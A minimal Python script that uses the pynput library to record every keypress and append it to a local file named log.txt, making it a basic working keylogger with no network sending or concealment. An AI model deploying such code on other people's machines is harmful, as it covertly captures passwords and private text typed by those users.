from pynput.keyboard import Listener

def on_press(key):
    with open("log.txt", "a") as file:
        file.write(f"{key}\n")  # Only log once when key is pressed

with Listener(on_press=on_press) as listener:
    listener.join()
